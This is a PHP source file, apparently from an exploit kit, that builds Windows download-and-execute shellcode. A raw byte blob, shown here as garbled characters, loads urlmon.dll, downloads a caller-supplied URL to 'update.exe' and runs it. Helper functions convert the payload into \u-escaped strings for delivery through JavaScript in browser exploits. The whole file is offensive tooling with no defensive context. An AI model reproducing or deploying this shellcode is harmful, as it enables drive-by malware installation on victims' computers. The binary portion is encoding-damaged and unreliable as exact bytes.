<?php

function uescape($s) {
	$out = '';
	$res = strtoupper( bin2hex( $s ) );
	$g = round( strlen( $res ) / 4 );

	if ($g != strlen( $res ) / 4) {
		$res .= '00';
	}

	$i = 0;

	while ($i < strlen( $res )) {
		$out .= '\u' . substr( $res, $i + 2, 2 ) . substr( $res, $i, 2 );
		$i += 4;
	}

	return $out;
}

function shellcode_dl_exec_hex($url) {
	$shellcode = str_to_hex( uescape( shellcode_dl_exec( $url ) ) );
	return $shellcode;
}

function shellcode_dl_exec_js($url) {
	$shellcode = uescape( shellcode_dl_exec( $url ) );
	return $shellcode;
}

function shellcode_dl_exec($url) {
	$shellcode = '' . '�B_�����������G' . '�������G�����G' . '��t`1�d�q0�v�v' . '�^�V �6f9Ju�\' . '$a��^`�l$$�E<�T' . 'x�J�Z ��7I�' . '4��1�1�����t
��' . '������;|$(uދZ' . '$�f�K�Z��' . '�D$a��Z1�RRSUR' . '����c�x������?<' . 'RP����1�R���3�`' . '�����RP�w���1' . 'ҁ�����������RS�' . '��ú3�^rRP�W����' . '��Z�+����lC<XRP�' . 'B���V���������ur' . 'lmon.dll�' . 'update.exe' . '�' . $url . '��';
		return $shellcode;
	}

	include_once( 'util.php' );
?>
